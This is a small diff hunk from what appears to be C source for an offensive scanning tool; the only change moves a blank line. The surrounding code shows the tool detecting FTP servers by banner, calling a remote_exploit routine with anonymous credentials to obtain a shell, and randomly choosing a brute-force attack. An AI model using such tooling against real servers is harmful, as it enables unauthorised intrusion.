@@ -159,8 +159,8 @@ int main(int argc, char *const *argv) {
       if(strstr(target->banner, "FTP") != NULL) {
         fprintf(stdout, "Attacking target \"%s:%u\"...\n", target->address, target->port);
         shell_fd = remote_exploit(target->address, target->port, "ftp", "mozilla@");
-
         method = rand() % 2;
+
         if(method == 0) {
 _bruteforce:
           fprintf(stdout, "Performing brute-force attack...\n");
